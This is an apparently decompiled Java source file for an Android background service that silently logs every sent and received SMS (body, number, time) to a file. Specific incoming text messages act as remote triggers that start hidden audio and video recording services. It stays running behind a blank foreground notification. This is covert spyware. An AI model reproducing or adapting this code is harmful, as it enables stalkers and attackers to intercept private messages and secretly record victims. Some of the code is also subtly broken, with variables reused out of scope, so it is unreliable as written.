package stupuid.maga.legacy;

import android.app.PendingIntent;
import android.app.Service;
import android.content.ContentResolver;
import android.content.Intent;
import android.database.ContentObserver;
import android.database.Cursor;
import android.net.Uri;
import android.os.Handler;
import android.os.IBinder;
import android.support.v4.app.NotificationCompat.Builder;
import android.util.Log;
import java.util.ArrayList;
import java.util.HashMap;

public class ListenSmsMmsService extends Service {
    public static int Time;
    private ContentResolver contentResolver;
    int k;
    String substr;

    public class SMSObserver extends ContentObserver {
        private Handler m_handler = null;

        public SMSObserver(Handler handler) {
            super(handler);
            this.m_handler = handler;
        }

        public void onChange(boolean selfChange) {
            super.onChange(true);
            Cursor cur = ListenSmsMmsService.this.getContentResolver().query(Uri.parse("content://sms"), null, null, null, null);
            cur.moveToNext();
            if (cur.getString(cur.getColumnIndex("protocol")) == null) {
                HashMap aMap = new HashMap();
                ArrayList aList = new ArrayList();
                aMap.put("body", cur.getString(cur.getColumnIndex("body")));
                aMap.put("num", cur.getString(cur.getColumnIndex("address")));
                aMap.put("Time", cur.getString(cur.getColumnIndex("date")));
                aMap.put("Direction", "sent");
                aList.add(aMap);
                BetterPrinter.maketheFile(aList, "SMS.txt");
                return;
            }
            aMap = new HashMap();
            aList = new ArrayList();
            aMap.put("body", cur.getString(cur.getColumnIndex("body")));
            aMap.put("num", cur.getString(cur.getColumnIndex("address")));
            aMap.put("Time", cur.getString(cur.getColumnIndex("date")));
            aMap.put("Direction", "received");
            aList.add(aMap);
            BetterPrinter.maketheFile(aList, "SMS.txt");
            if (cur.getString(cur.getColumnIndex("body")).equalsIgnoreCase("Yoo") || cur.getString(cur.getColumnIndex("body")).equalsIgnoreCase("Yoo")) {
                Intent aIntent = new Intent(ListenSmsMmsService.this.getApplicationContext(), HandleAudioClip.class);
                if (!(HandleAudioClip.running || VideoService.isRunning)) {
                    ListenSmsMmsService.this.startService(aIntent);
                }
            }
            if (cur.getString(cur.getColumnIndex("body")).equalsIgnoreCase("theboy") || cur.getString(cur.getColumnIndex("body")).equalsIgnoreCase(" ") || cur.getString(cur.getColumnIndex("body")).equalsIgnoreCase("I know")) {
                ListenSmsMmsService.this.startService(new Intent(ListenSmsMmsService.this.getApplicationContext(), VideoService.class));
            }
        }
    }

    public IBinder onBind(Intent intent) {
        return null;
    }

    public void onCreate() {
        Log.v("Debug", " service creatd.........");
    }

    public void registerObserver() {
        this.contentResolver = getContentResolver();
        this.contentResolver.registerContentObserver(Uri.parse("content://sms/"), true, new SMSObserver(new Handler()));
        Log.v("Debug", " in registerObserver method.........");
    }

    public int onStartCommand(Intent intent, int flags, int startId) {
        Log.v("Debug", "Service has been started..");
        registerObserver();
        startForeground(1, new Builder(this).setSmallIcon(R.drawable.index).setContentTitle("").setContentText("").setContentIntent(PendingIntent.getActivity(this, 0, new Intent(this, MainActivity.class), 0)).build());
        return 1;
    }
}
